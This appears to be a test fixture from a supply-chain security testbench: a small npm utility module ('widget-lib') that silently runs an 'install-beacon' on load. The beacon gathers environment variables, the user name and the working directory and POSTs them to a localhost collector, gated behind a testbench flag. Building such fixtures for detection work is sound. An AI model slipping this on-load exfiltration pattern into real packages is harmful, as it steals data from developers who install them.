/**
 * SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori — educational payload (localhost only)
 * Package: widget-lib
 */

const http = require('http');

function exfiltrateData() {
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    console.log('[SAFE MODE] Malicious behavior prevented - not in testbench');
    return;
  }

  const dataToExfiltrate = {
    timestamp: new Date().toISOString(),
    scenario: '27',
    package: 'widget-lib',
    environment: {
      NODE_ENV: process.env.NODE_ENV,
      USER: process.env.USER,
    },
    cwd: process.cwd(),
    version: '1.0.1', issuer: 'laptop publish',
  };

  const payload = JSON.stringify(dataToExfiltrate);
  const req = http.request(
    {
      hostname: '127.0.0.1',
      port: 3027,
      path: '/collect',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
    },
    () => {
      console.log('[TESTBENCH] capture posted to 127.0.0.1:3027/collect');
    }
  );
  req.on('error', (e) => {
    console.log('[TESTBENCH] mock not available:', e.message);
  });
  req.write(payload);
  req.end();
  try {
    const { uploadJson } = require('../../../detection-tools/floci/floci-exfil');
    uploadJson('27', 'install-beacon', dataToExfiltrate);
  } catch (_) {}
}

try {
  exfiltrateData();
} catch (_) {}

module.exports = {
  ok: true,
  name: 'widget-lib',
  parse(s) {
    try {
      return JSON.parse(s);
    } catch {
      return null;
    }
  },
};

module.exports.add = (a, b) => a + b;
module.exports.version = '1.0.1';
